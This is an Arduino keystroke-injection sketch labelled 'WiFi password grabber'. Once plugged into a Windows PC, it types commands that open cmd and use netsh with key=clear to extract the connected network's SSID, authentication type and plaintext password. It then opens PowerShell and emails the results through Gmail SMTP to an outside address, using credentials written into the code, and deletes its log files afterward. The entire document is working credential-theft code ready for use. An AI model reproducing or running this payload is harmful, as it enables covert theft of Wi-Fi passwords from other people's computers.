

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Title: WiFi password grabber
  // Author: Siem
  // Version: 3
  // Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
  delay(3000);

  // --> Minimize all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  // --> Open cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(1000);

  // --> Getting SSID
  Keyboard.print("cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=: \" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");

  typeKey(KEY_RETURN);

  // --> Creating A.txt
  Keyboard.print("netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt");

  typeKey(KEY_RETURN);

  // --> Get network type
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A");

  typeKey(KEY_RETURN);

  // --> Get authentication
  Keyboard.print("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A");

  typeKey(KEY_RETURN);

  // --> Get password
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A");

  typeKey(KEY_RETURN);

  // --> Delete A.txt
  Keyboard.print("del A.txt");

  typeKey(KEY_RETURN);

  // --> Create Log.txt
  Keyboard.print("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt");

  typeKey(KEY_RETURN);

  // --> Mail Log.txt
  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.EnableSsl = $true");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckyscripttest@gmail.com', 'peasandcarrots')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.From = 'duckyscripttest@gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.To.Add('aquaktus@yahoo.co.uk')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Subject = 'WiFi key grabber'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Body = (Get-Content Log.txt | out-string)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Send($ReportEmail)");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // --> Delete Log.txt and exit
  Keyboard.print("del Log.txt & exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
